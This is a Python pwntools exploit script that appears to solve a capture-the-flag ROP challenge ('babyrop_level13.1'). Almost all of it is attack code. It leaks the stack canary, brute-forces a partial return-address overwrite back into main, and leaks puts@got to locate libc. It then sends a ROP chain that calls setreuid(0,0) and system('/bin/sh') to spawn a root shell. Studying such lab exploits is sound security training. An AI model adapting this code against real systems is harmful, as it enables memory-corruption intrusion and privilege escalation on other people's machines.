from pwn import *

context.arch = 'amd64'

context.terminal = ['tmux', 'splitw', '-h']

#p = gdb.debug("/challenge/babyrop_level13.0", gdbscript="source /opt/gef/gef.py")
while True:
    p = process("/challenge/babyrop_level13.1")
    p.recvuntil(b"located at: ")
    input_buffer = int(p.recvuntil(b".")[:-1], 16)
    canary_addr = input_buffer + 0x68
    p.sendline(hex(canary_addr).encode())
    p.recvuntil(b"= ")
    canary = int(p.recvuntil(b"\n")[:-1], 16)

    buf = b"A" * 0x68 # right before fake rbp
    fake_rbp = input_buffer + 0x90
    #payload = padding + p64(canary) + p64(fake_rbp) + pack(leave_ret, 24)
    payload = buf + p64(canary) + p64(input_buffer + 0x98+ 0x70) + p16(0x4069) # libc_start_main:0x24069
    p.send(payload)
    sleep(0.5)
    s = p.wait(timeout=10)
    all = p.recv()
    all += p.recv()
    print(all.decode())
    if all.find(b"Welcome") != -1:
        break
    else:
        p.close()
# below got executed if if return to main
# jumping right into arbitrary 8 bytes read
# leak libc base addr by leaking puts@plt addr. First we leak main addr then we add offset of puts@plt and puts@got. main addr located 0x20 below return addr
p.sendline(hex(input_buffer + 0x98))
p.recvuntil("= ")
main_addr = int(p.recvuntil("\n")[:-1], 16)
elf = ELF("/challenge/babyrop_level13.1")

print("main addr: "+hex(main_addr))

binary_base = main_addr - elf.sym['main']
elf.address = binary_base
rop = ROP(elf)
pop_rdi = rop.rdi.address
puts_plt = elf.plt.puts
puts_got = elf.got.puts
start = elf.sym['_start']

# leak puts@got addr
rop.raw(pop_rdi)
rop.raw(puts_got)
rop.raw(puts_plt)
rop.raw(start)

payload = buf + p64(canary) + p64(fake_rbp) + rop.chain()
p.send(payload)

print(p.recv())
p.recvuntil("Goodbye!\n")
puts_addr = unpack(p.recvuntil("\n")[:-1], 'all')
print("puts addr: "+hex(puts_addr))

# get libc base addr
libc = ELF(p.libc.path)
libc.address = puts_addr - libc.symbols['puts']

# system("/bin/sh")
bin_sh = next(libc.search(b'/bin/sh'))
rop = ROP(libc)
rop.setreuid(0, 0)  # equivalent to rop.call(libc.setreuid, [0, 0])
rop.system(bin_sh)  # equivalent to rop.call(libc.system, [bin_sh])

# we returned to main so we need to pass the leak. Not necessary, just dummy.
p.sendline(hex(input_buffer + 0x50 + 0x8 + 0x20))
p.send(buf + p64(canary) + p64(fake_rbp) + rop.chain())

p.interactive()